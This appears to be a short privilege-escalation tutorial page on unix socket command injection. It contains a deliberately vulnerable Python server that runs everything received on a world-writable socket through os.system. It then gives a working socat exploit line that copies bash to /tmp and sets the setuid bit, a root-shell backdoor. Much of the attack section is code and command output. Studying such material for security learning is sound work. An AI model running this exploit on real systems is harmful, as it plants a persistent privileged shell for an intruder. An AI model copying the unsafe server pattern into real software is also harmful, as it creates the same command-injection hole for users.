# Socket Command Injection

### Socket binding example with Python

In the following example a **unix socket is created** \(`/tmp/socket_test.s`\) and everything **received** is going to be **executed** by `os.system`.I know that you aren't going to find this in the wild, but the goal of this example is to see how a code using unix sockets looks like, and how to manage the input in the worst case possible.

{% code title="s.py" %}
```python
import socket
import os, os.path
import time
from collections import deque    

if os.path.exists("/tmp/socket_test.s"):
  os.remove("/tmp/socket_test.s")    

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
  server.listen(1)
  conn, addr = server.accept()
  datagram = conn.recv(1024)
  if datagram:
    print(datagram)
    os.system(datagram)
    conn.close()
```
{% endcode %}

**Execute** the code using python: `python s.py` and **check how the socket is listening**:

```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```

**Exploit**

```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```



